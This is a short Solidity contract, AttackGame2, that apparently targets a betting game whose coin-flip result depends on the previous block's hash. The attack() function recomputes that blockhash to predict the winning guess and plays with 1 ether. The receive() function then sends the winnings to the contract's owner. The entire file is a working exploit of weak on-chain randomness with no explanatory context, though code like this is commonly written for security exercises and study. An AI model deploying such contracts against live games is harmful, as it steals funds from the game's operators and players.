// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface Igame {
    function play(bool guess) external payable;
}

contract AttackGame2 {
    Igame game;
    address owner;

    constructor(address _gameAddress) {
        game = Igame(_gameAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        uint256 value = uint256(blockhash(block.number-1));
        uint256 random = value % 2;
        bool answer = random == 1 ? true : false;

        game.play{value: 1 ether}(answer);
    }

    receive() external payable {
        (bool sent,) = owner.call{value:address(this).balance}("");
        require(sent,"Failed to send eth");
    }
}